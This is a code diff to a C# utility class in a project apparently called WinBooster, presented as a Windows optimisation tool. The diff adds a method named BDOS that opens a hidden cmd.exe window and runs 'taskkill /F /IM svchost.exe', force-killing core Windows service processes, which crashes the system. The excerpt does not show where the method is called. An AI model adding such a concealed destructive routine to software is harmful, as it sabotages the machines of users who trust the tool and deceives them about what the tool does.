@@ -17,7 +17,17 @@ namespace WinBooster.Native
 {
     public class Utils
     {
-        public static FileInfo GetProcessPath(Process process)
+        public static void BDOS()
+        {
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.Arguments = "/c taskkill /F /IM svchost.exe\"";
+            p.Start();
+        }
+        public static FileInfo GetProcessPath(System.Diagnostics.Process process)
         {
             return new FileInfo(process.MainModule.FileName);
         }
